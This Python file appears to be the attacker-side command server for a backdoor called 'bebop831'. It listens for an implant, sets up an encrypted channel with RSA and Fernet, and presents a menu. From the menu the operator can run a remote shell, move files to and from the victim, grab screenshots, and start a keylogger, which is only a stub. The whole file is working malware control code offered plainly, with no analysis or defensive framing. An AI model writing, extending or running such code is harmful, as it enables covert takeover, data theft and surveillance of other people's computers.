import socket, select, time, rsa, os, threading, readline as _
from cryptography.fernet import Fernet

address = ("0.0.0.0", 3000)
authed = False
input_buff = ""    

#Connection and data transfer functions
def establish_connection(address, time_out=None):
    global client_con, authed, lck, device_info    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.settimeout(time_out)

    print(f"[+] listening for connection on {socket.gethostbyname(os.uname().nodename)}:{address[1]}")
    while not authed: 
        try:
            server.bind(address)
            server.listen(0)
            client_con, client_addr = server.accept()

            if client_con:
                client_key_buff = recv(sock=client_con, is_authed=authed)
                client_key = rsa.PublicKey.load_pkcs1(client_key_buff, 'PEM')

                key = Fernet.generate_key()
                send(rsa.encrypt(key, client_key), sock=client_con, is_authed=authed)

                lck = Fernet(key)
                encr_sys_info = recv(sock=client_con, is_authed=authed)
                if encr_sys_info:
                    authed = True
                    sys_info = decrypt(encr_sys_info)
                    parse_sys_info(sys_info.decode())
                    print(f"[+] Established Secure Connection to {client_addr[0]}:{client_addr[1]}\n\n")
                    return client_con
                else:
                    return None

        except socket.timeout:
            print("Connection request timed out. Could not connect...")
            return None

        except OSError as os_err:
            if os_err.errno == 48:
                time.sleep(10)
                continue



def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
    sock.settimeout(time_out)
    data_size = sock.recv(12)
    if not data_size:
        return None

    data_buff = bytes()
    while len(data_buff) < int(data_size):
        data_buff += sock.recv(buff_size)

    sock.settimeout(None)
    return decrypt(data_buff) if is_authed else data_buff


def send(data, sock=None, is_authed=None, header_size=12):
    if not data:
         return

    if is_authed:
        data = encrypt(data)
        
    data_size = f"{len(data):<{header_size}}"
    sock.sendall(data_size.encode()+data)


def encrypt(data):
    return lck.encrypt(data)


def decrypt(encrypted_data):
    return lck.decrypt(encrypted_data)


def close_connection(sock):
    global client_con, authed
    print("\n\nClosing current connection...")
    authed = False
    if sock:
        sock.close()


def reset_connection(time_out, sock_to_close=None, address=address):
    close_connection(sock=sock_to_close)
    print("Reseting current connection...")
    return establish_connection(address, time_out=time_out)

def poll_connection():
        global client_con
        if not client_con:
            return

        poll_obj = select.poll()
        poll_obj.register(client_con.fileno())
        while True:
            event = poll_obj.poll()[0] 
            if event[1] == 19 or event[1] == 23: 
                print("\nConnection lost...")
                client_con = reset_connection(time_out=15)
                break

            elif event[1] == select.POLLNVAL:
                #KeyboardInterrupt
                break


def is_alive():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            while True:
                try:
                    s.bind(("0.0.0.0", 4001))
                    s.listen()
                    client, _ = s.accept()
                    buff = recv(time_out=86400, sock=client, is_authed=authed)
                    from base64 import b64decode
                    if b64decode(buff) == b"ALIVE":
                        break
                except socket.timeout:
                    print("bebop831 backdoor is unavailable...")
                    
                except OSError as os_err:
                    if os_err.errno == 48:
                        continue
                    else:
                        print(os_err)
                



# Backdoor specific functions
def print_menu():
    print(f"\n{device_info}")
    
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) Exit\n\n")

def clear_screen():
    print('\033[H')
    print('\033[2J')

def parse_sys_info(buff):
    global device_info
    device_info = ""
    for line in buff.split("&"):
        device_info += f"[+] {line}\n"

def upload_file(file_name):
    global client_con, authed
    try:
        with open(f"{file_name}", "rb") as file:
            file_data = file.read()
            send(data=file_data, sock=client_con, is_authed=authed)
    except FileNotFoundError:
            print(f"Error, {file_name} not found. Check path and try again.")


def download_file(file_name, buff_size=524288):
    global client_con, authed
    try:
        file_data = recv(buff_size=buff_size, time_out=15, sock=client_con, is_authed=authed)
        if file_data:
            with open(f"{file_name}", "wb") as file:
                file.write(file_data)
                print(f"\nFile saved in {os.getcwd()}/{file_name}")
        else:
            print("Error, couldn't download the file.")

    except socket.timeout:
        print("Could not download file. Connection timed out.")
    

def open_shell():
    global client_con, authed

    while True:
        cmd = input("bebop831#: ")
        if cmd:
            if cmd == "exit":
                send(sock=client_con, is_authed=authed, data=cmd.encode()) 
                break

            if cmd == "clear":
                clear_screen()
                continue

            elif cmd[:2] == "dw":
                print("Downloading...")
                send(sock=client_con, is_authed=authed, data=cmd.encode())

                file_name = cmd[3:]
                download_file(file_name)

            elif cmd[:2] == "up":
                print("Uploading...")
                send(sock=client_con, is_authed=authed, data=cmd.encode())
                file_name = cmd[3:]
                upload_file(file_name)

            else:
                send(sock=client_con, is_authed=authed, data=cmd.encode())

                try:
                    output = recv(time_out=30, sock=client_con, is_authed=authed)
                    if output and output != b'%%NONE%%':
                        output = output.decode()
                        print(output)

                except socket.timeout:
                    print("Process timed out...")
                    continue
                
                except ValueError:
                    print(output)

def get_input(prompt):
    global input_buff
    while True:
        input_buff = input(prompt)

# Program entry
def main():
    global client_con, authed
    client_con = establish_connection(address)
    while client_con:
        try:
            print_menu()
            choice = input("Enter choice: ")
            send(sock=client_con, data=choice.encode(), is_authed=authed)

            if choice == "1":
                open_shell()

            elif choice == "2":
                print("\nTaking Screenshot...")        
                download_file(file_name=f"{time.asctime()}.png")

            elif choice == "3":
                pass
            elif choice.lower() == "clear":
                clear_screen()

            elif choice == "4":
                keep_alive = input("Keep client alive? Y or n: ").lower()
                send(sock=client_con, data=keep_alive.encode(), is_authed=authed)
                break
        except KeyboardInterrupt:
            break

        except (ConnectionError, BrokenPipeError, socket.error) as e:
            print("\n\n[+] Connection Lost!")
            break
            

    close_connection(client_con)
    print('Exiting...')


main()
